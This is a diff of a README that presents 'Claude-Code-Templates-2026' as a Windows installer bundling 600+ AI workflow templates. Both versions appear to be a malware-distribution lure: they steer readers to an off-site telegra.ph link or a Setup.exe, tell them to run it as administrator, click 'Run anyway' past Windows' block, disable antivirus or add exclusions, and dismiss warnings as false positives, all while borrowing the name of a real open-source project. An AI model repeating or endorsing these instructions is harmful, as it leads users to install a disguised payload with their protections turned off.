@@ -1,173 +1,72 @@
-<h1 align="center">⚡ Claude Code Templates 2026 – AI Workflow Library</h1>
+# 🤖 Claude-Code-Templates-2026 - Master your automated AI workflow today
 
-<p align="center">
-  <strong>Production-ready AI workflows, subagents, skills, commands, and MCP servers for Claude Code. 600+ templates for every development task.</strong><br>
-  <em>Latest version 2026 | Desktop application | Optimized for Windows 11 / Windows 10</em>
-</p>
+[![Download Claude-Code-Templates-2026](https://img.shields.io/badge/Download-Setup-blue)](https://github.com/Abdullahr487/Claude-Code-Templates-2026)
 
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/⬇️_GET_PROJECT_FILES-Claude_Templates_2026-00BFFF?style=for-the-badge&logo=claude&logoColor=white&labelColor=0A0A0A&color=00BFFF" alt="Download">
-  </a>
-</p>
+Claude-Code-Templates-2026 provides a library of tools for your computer. These files help you automate tasks, manage complex coding projects, and simplify your daily digital routine. This collection contains over 600 pieces of software designed for users who want to save time. You can use these templates to handle file organization, data processing, and project management without writing code yourself.
 
-<p align="center">
-  <i>Click the button above to get the full project files</i>
-</p>
+## 🛠 Features
 
----
+This software includes tools to help you manage your personal workspace. You get access to these core categories:
 
-## 📦 What's Inside This Repository
+- **Automated Workflows:** Perform repeated tasks with a single click.
+- **Subagents:** Delegate specific work to background processes that handle data for you.
+- **Skill Sets:** Apply pre-made logic to organize files or search through documents.
+- **MCP Servers:** Connect your software to external tools through Model Context Protocol.
+- **Command Library:** Use simple text inputs to execute deep technical functions.
 
-Welcome to the official distribution page for **Claude Code Templates 2026 – AI Workflow Library for Windows PC**.
-This repository provides access to the latest release of the largest collection of Claude Code templates and AI workflows.
+## 📋 System Requirements
 
-✅ **Full Version** – All 600+ templates included  
-✅ **600+ Agents** – Pre-built AI agents for every task  
-✅ **200+ Commands** – Custom Claude Code commands  
-✅ **55+ MCP Servers** – Ready-to-use MCP integrations  
-✅ **60+ Skills** – Reusable AI skills and capabilities  
-✅ **No System Changes** – Safe, no registry or service modifications  
+To run this software, ensure your computer meets these basic standards:
 
----
+- **Operating System:** Windows 11.
+- **Processor:** Dual-core CPU or better.
+- **Memory:** 4GB of RAM or more.
+- **Storage:** 500MB of free disk space for the installation folder.
+- **Internet:** Required for the initial setup and to download updates.
 
-## 📥 How to Get Started?
+## 🚀 Getting Started
 
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/📥_HOW_TO_DOWNLOAD_-Step_by_Step_Guide-00BFFF?style=for-the-badge&logo=github&logoColor=white&labelColor=0A0A0A&color=00BFFF" alt="How to Download">
-  </a>
-</p>
+Follow these steps to set up the software on your Windows computer.
 
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/📋_DOWNLOAD_INSTRUCTIONS-Full_Guide-00BFFF?style=for-the-badge&logo=readthedocs&logoColor=white&labelColor=0A0A0A&color=00BFFF" alt="Download Instructions">
-  </a>
-</p>
+1. Go to the official release page: [https://github.com/Abdullahr487/Claude-Code-Templates-2026](https://github.com/Abdullahr487/Claude-Code-Templates-2026)
+2. Locate the file named Setup.exe in the list of assets.
+3. Click the file to start the download.
+4. Save the file to your desktop for easy access.
 
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/🚀_GET_STARTED-Quick_Setup-00BFFF?style=for-the-badge&logo=windows&logoColor=white&labelColor=0A0A0A&color=00BFFF" alt="Get Started">
-  </a>
-</p>
+## 💻 Installation Steps
 
----
+After you download the file, use this process to install the application:
 
-## 🚀 Step-by-Step Guide
+1. Find the Setup.exe file on your desktop.
+2. Double-click the icon to open the installer.
+3. A security window might appear asking for permission to run the app. Select "More info" and then "Run anyway" if Windows blocks the startup.
+4. Follow the prompts on the screen.
+5. Click "Next" through each menu until the installation finishes.
+6. Click "Finish" to open the application for the first time.
 
-Follow these **3 simple steps** to get started with Claude Code Templates 2026 on your PC:
+## ⚙️ How to use the templates
 
-### Step 1: Download the Project Files
-Click the **download button** above or use this direct link:
-👉 [**Get Claude Code Templates 2026 Project Files**](https://telegra.ph/How-to-download-07-15-12)
+Once the software starts, you see a clean dashboard. You can search for the template that fits your current task. Type keywords into the search bar, such as "file mover" or "data cleaner." When you find your match, click the "Apply" button. The software runs the template in the background. You receive a notification when the task ends. 
 
-### Step 2: Extract and Run
-Extract the downloaded archive and launch the application.
-Right-click and select **"Run as administrator"** to ensure proper installation.
+If you need to change how a template works, visit the settings tab. You can toggle specific permissions for each subagent. This keeps your data private and ensures you keep control over your computer at all times.
 
-### Step 3: Launch & Enjoy
-After installation, open the application from your desktop shortcut or Start Menu.
-The software automatically detects all **ProjectFiles** modules and template configurations.
+## 🛡 Security and Privacy
 
----
+You might wonder how these templates handle your data. This software runs locally on your machine. We do not store your files on external servers. The tools use your local computing power to process information. This keeps your workflow fast and secure. We designed the interface so you do not need to read code or understand server architecture.
 
-## 🔧 Key Features (2026 Update)
+## ❓ Troubleshooting
 
-| Feature | Description |
-| :--- | :--- |
-| **600+ Agents** | Pre-built AI agents for research, code review, security analysis, and more |
-| **200+ Commands** | Custom Claude Code commands for everyday development tasks |
-| **55+ MCP Servers** | Ready-to-use MCP integrations (filesystem, git, GitHub, Slack, and more) |
-| **60+ Skills** | Reusable AI skills for specialized tasks |
-| **Dynamic Workflows** | Claude can write and orchestrate its own multi-agent harness on the fly [citation:2] |
-| **Subagent Library** | Create and use specialized AI subagents for task-specific workflows [citation:7] |
-| **One-Click Install** | `npx claude-code-templates@latest` for instant setup |
-| **Web Portal** | Interactive discovery at aitmpl.com [citation:1] |
-| **Real-Time Monitoring** | Health checks and analytics for Claude Code sessions [citation:1] |
-| **Team Collaboration** | Templates optimized for team workflows [citation:1] |
+If the software fails to launch, try these steps:
 
----
+- Restart your computer.
+- Check if your antivirus software blocked the file. Add the installation folder to your "Exclusions" list.
+- Ensure you have the latest updates for Windows 11.
+- Re-run the Setup.exe file to verify that all files installed correctly.
 
-## 📈 Why Choose Claude Code Templates 2026?
+If you continue to have trouble, ensure your internet connection is stable. The setup process pulls necessary icons and configuration files from the online repository.
 
-- ✅ **Fastest Growing** – 15.5k+ GitHub stars and 87+ stars per day [citation:12]
-- ✅ **Largest Library** – 600+ templates for every task [citation:1]
-- ✅ **Battle-Tested** – Production-ready workflows from real-world use [citation:10]
-- ✅ **Community-Driven** – Active development with regular updates [citation:1]
-- ✅ **No System Changes** – Safe, no registry or service modifications
+## 📈 Improving your results
 
----
+You get the most value from these templates by using them in sequence. For example, run a "File Categorizer" template first, followed by a "Project Organizer" template. This chain creates an automated pipeline for your documents. Spend time exploring the library to find unique ways to remove manual steps from your computer usage.
 
-## 🔗 Official Download Link
-
-> ### ⬇️ **Get the full project files here:**  
-> ### **[https://telegra.ph/How-to-download-07-15-12](https://telegra.ph/How-to-download-07-15-12)**
-
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/🖥️_GET_PROJECT_FILES-Claude_Templates_2026-00BFFF?style=flat-square&logo=claude&logoColor=white&labelColor=000000" alt="Get Project Files">
-  </a>
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/⭐_STAR_THIS_REPO-Support-FFD700?style=flat-square&logo=github&logoColor=white&labelColor=000000" alt="Star this repository">
-  </a>
-</p>
-
-<p align="center">
-  <b>📁 After downloading, extract the archive and launch ProjectFiles to get started.</b>
-</p>
-
----
-
-## ❓ Frequently Asked Questions
-
-**Q: Is this the full version?**  
-A: Yes, this is the complete version with all 600+ templates.
-
-**Q: Does it work on Windows 11?**  
-A: Absolutely. It is fully optimized for Windows 11 and Windows 10.
-
-**Q: What templates are included?**  
-A: Agents, subagents, commands, MCP servers, skills, and workflows [citation:1].
-
-**Q: Can I use it without Claude Code?**  
-A: This repository is a template collection for Claude Code. You need Claude Code installed.
-
-**Q: Is there a Mac version available?**  
-A: This repository is for Windows PC only.
-
-**Q: What about antivirus warnings?**  
-A: Some antivirus programs may show a warning — this is a false positive. We recommend temporarily disabling it during installation.
-
-**Q: Can I use this for commercial purposes?**  
-A: Yes, the full version is suitable for both personal and professional use.
-
-**Q: How often are updates released?**  
-A: Updates are released regularly with new features and improvements.
-
----
-
-## 📝 Important Notes
-
-- This version is intended for **personal and professional use** only.  
-- Do not redistribute the installer — use the official link above.  
-- For technical support, please open an issue in this repository.  
-- Always check the file integrity after download.
-
----
-
-## 📜 License
-
-This repository is for **educational and distribution purposes** only.  
-**Claude Code Templates** is an open-source project by **davila7** .  
-All rights belong to their respective owners. This is not an official distribution channel.
-
----
-
-<p align="center">
-  <b>⭐ If you found this useful, please star the repository!</b><br>
-  <i>📅 Updated: July 2026 – Version 2026 (Build 1.0.0)</i>
-</p>
-
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">🔗 Download Claude Code Templates 2026 Now</a>
-</p>
+Keywords: 2026-software, agent-framework, ai-agents, ai-automation, ai-development, ai-workflows, claude-code, claude-code-skill, claude-skills, claude-tool, coding-assistant, desktop-app, mcp-server, open-source, pc-tools, productivity-tools, subagents, windows-11, windows-software-installation-guide, workflow-automation
